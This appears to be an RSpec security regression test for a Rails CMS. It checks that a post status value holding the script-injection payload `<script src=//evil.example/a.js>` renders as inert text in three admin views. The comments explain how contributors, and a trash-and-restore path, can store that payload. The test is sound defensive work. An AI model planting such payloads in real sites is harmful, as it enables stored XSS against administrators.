# frozen_string_literal: true

require 'rails_helper'

# `PostDecorator#the_status` maps the five canonical statuses to I18n labels and falls through to the
# raw column value for anything else, building its markup by string interpolation. Three admin views
# render the result through `raw`, so a status that is not canonical is emitted as live markup.
#
# `posts.status` is writable at contributor privilege -- `get_post_data` permits `:status`, the model
# has no `inclusion:` validation, and the only guard rewrites the exact literal 'published'.
#
# `titleize` is not a mitigation: HTML tag and attribute names are case-insensitive and so are DNS
# hostnames, so the titleized `<Script Src=//Evil.Example/A.Js>` loads and executes just the same.
# Every assertion below therefore matches case-insensitively.
RSpec.describe 'Security: post status output escaping', type: :request do
  init_site

  let(:current_site) { Cama::Site.first.decorate }
  let(:admin) { create(:user, role: 'admin', site: current_site) }
  let(:post_type) { current_site.post_types.where(slug: 'post').first }
  let(:payload) { "x'><script src=//evil.example/a.js></script>" }

  let!(:poisoned_post) do
    post_type.posts.create!(title: 'Ordinary looking post', slug: 'ordinary-looking-post',
                            content: 'nothing to see here', user_id: admin.id, status: 'pending')
  end

  before { allow_any_instance_of(CamaleonCms::AdminController).to receive(:current_site).and_return(current_site) }

  def poison_status!(value = payload)
    poisoned_post.update_column(:status, value) # rubocop:disable Rails/SkipsModelValidations
  end

  def parsed_body
    Nokogiri::HTML5.parse(response.body)
  end

  # The payload as it reaches the page: `the_status` titleizes the column value before interpolating.
  def payload_as_text
    payload.titleize
  end

  def injected_script_sources(doc)
    doc.css('script[src]').map { |node| node['src'] }.grep(/evil\.example/i)
  end

  describe 'the three sinks that render the status label' do
    before do
      poison_status!
      sign_in_as(admin, site: current_site)
    end

    it 'renders the payload as inert text in the post list' do
      get "/admin/post_type/#{post_type.id}/posts", params: { s: 'all' }

      table = parsed_body.at_css('#posts-table-list')
      expect(table.css('script')).to be_empty
      expect(table.at_css("tr[data-id='#{poisoned_post.id}'] .label-form").text).to eq(payload_as_text)
    end

    it 'renders the payload as inert text on the post edit form' do
      get "/admin/post_type/#{post_type.id}/posts/#{poisoned_post.id}/edit"

      doc = parsed_body
      expect(injected_script_sources(doc)).to be_empty
      expect(doc.at_css('.label-form').text).to eq(payload_as_text)
    end

    it 'renders the payload as inert text in the admin search results' do
      get '/admin/search', params: { kind: 'content', q: 'ordinary looking' }

      doc = parsed_body
      expect(injected_script_sources(doc)).to be_empty
      expect(doc.at_css('.label-form').text).to eq(payload_as_text)
    end
  end

  # The source. A role holding only `edit` on the post type gets `:create_post` but not
  # `:publish_post`, which is the lowest privilege that can create content at all.
  describe 'reaching the column at contributor privilege' do
    let(:contributor_role) { current_site.user_roles.create!(name: 'Contributor', slug: 'contributor') }
    let(:contributor) { create(:user, role: contributor_role.slug, site: current_site) }

    before do
      contributor_role.set_meta("_post_type_#{current_site.id}", { 'edit' => [post_type.id.to_s] })
      sign_in_as(contributor, site: current_site)
    end

    it 'stores the submitted status verbatim' do
      post "/admin/post_type/#{post_type.id}/posts", params: {
        post: { title: 'Contributor post', slug: 'contributor-post', content: 'x', status: payload }
      }

      expect(response).to have_http_status(:found)
      expect(post_type.posts.find_by(slug: 'contributor-post').status).to eq(payload)
    end
  end

  # `set_options` iterates the submitted hash with no key allow-list, so `options[:status_default]`
  # is attacker-settable, and `restore` writes it back with `update_column` -- skipping validations
  # and callbacks. `trash` stamps `status_default` with the status it is replacing, so the payload
  # has to be planted after trashing; `restore` then hands it straight to the column. This is why a
  # model `inclusion:` validation on `status` would not have closed the hole.
  describe 'the options[:status_default] -> trash -> update -> restore path' do
    before { sign_in_as(admin, site: current_site) }

    it 'writes the payload into the column and still renders it inert' do
      get "/admin/post_type/#{post_type.id}/posts/#{poisoned_post.id}/trash"
      patch "/admin/post_type/#{post_type.id}/posts/#{poisoned_post.id}", params: {
        post: { title: poisoned_post.title, slug: poisoned_post.slug, status: 'trash' },
        options: { status_default: payload }
      }
      get "/admin/post_type/#{post_type.id}/posts/#{poisoned_post.id}/restore"

      expect(poisoned_post.reload.status).to eq(payload)

      get "/admin/post_type/#{post_type.id}/posts", params: { s: 'all' }

      table = parsed_body.at_css('#posts-table-list')
      expect(table.css('script')).to be_empty
      expect(table.at_css("tr[data-id='#{poisoned_post.id}'] .label-form").text).to eq(payload_as_text)
    end
  end
end
